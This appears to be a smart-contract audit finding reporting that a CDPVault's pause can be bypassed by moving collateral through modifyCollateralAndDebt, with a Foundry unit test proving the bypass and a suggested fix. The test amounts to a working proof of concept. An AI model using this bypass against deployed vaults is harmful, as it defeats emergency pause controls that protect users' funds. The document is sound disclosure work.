# Vulnerability details

## Impact
If the vault is paused, users are blocked from depositing and withdrawing their collateral, this is done using the `whenNotPaused` modifier. However, users can bypass this using `modifyCollateralAndDebt` by passing non-zero `deltaCollateral` to deposit and withdraw collateral.

This allows users/attackers to bypass the protocol's pausing state.

## Proof of Concept

Add the following in `src/test/unit/CDPVault.t.sol`:

```solidity
address admin = makeAddr("ADMIN");
address bob = makeAddr("BOB");

function test_canDepositWithdrawWhenPaused() public {
    CDPVault vault = createCDPVault(
        CDPVaultConstants({
            pool: liquidityPool,
            oracle: oracle,
            token: token,
            tokenScale: 10 ** IERC20Metadata(address(token)).decimals()
        }),
        CDPVaultConfig({
            debtFloor: 1 ether,
            liquidationRatio: 1.25 ether,
            liquidationPenalty: 1 ether,
            liquidationDiscount: 0,
            roleAdmin: admin,
            vaultAdmin: admin,
            pauseAdmin: admin
        }),
        150 ether
    );
    createGaugeAndSetGauge(address(vault));

    token.mint(bob, 200 ether);

    // Verify that the vault is not paused
    assertFalse(vault.paused());

    vm.startPrank(bob);
    token.approve(address(vault), type(uint256).max);
    address position = address(new PositionOwner(vault));

    // Bob doesn't have any collateral
    (uint256 collateral, , , , , ) = vault.positions(position);
    assertEq(collateral, 0);
    assertEq(token.balanceOf(address(vault)), 0);

    // Bob deposits 100 ETH
    vault.deposit(position, 100 ether);

    // Bob has 100 ETH collateral
    (collateral, , , , , ) = vault.positions(position);
    assertEq(collateral, 100 ether);
    assertEq(token.balanceOf(address(vault)), 100 ether);
    vm.stopPrank();

    // Pause the vault
    vm.prank(admin);
    vault.pause();

    // Verify that the vault is paused
    assertTrue(vault.paused());

    // Bob can't deposit when the vault is paused
    vm.prank(bob);
    vm.expectRevert(); // Pausable: paused
    vault.deposit(position, 100 ether);

    // Bob can deposit when the vault is paused using `modifyCollateralAndDebt`
    vm.prank(bob);
    vault.modifyCollateralAndDebt(position, bob, bob, 100 ether, 0);

    // Bob has 200 ETH collateral
    (collateral, , , , , ) = vault.positions(position);
    assertEq(collateral, 200 ether);
    assertEq(token.balanceOf(address(vault)), 200 ether);

    // Bob can't withdraw when the vault is paused
    vm.prank(bob);
    vm.expectRevert(); // Pausable: paused
    vault.withdraw(position, 100 ether);

    // Bob can withdraw when the vault is paused using `modifyCollateralAndDebt`
    vm.prank(bob);
    vault.modifyCollateralAndDebt(position, bob, bob, -100 ether, 0);

    // Bob has 100 ETH collateral
    (collateral, , , , , ) = vault.positions(position);
    assertEq(collateral, 100 ether);
    assertEq(token.balanceOf(address(vault)), 100 ether);
}
```

## Recommended Mitigation Steps
Block collateral movement in `CDPVault::modifyCollateralAndDebt`, by adding something like:
```solidity
if (deltaCollateral != 0 && paused()) revert ...;
```
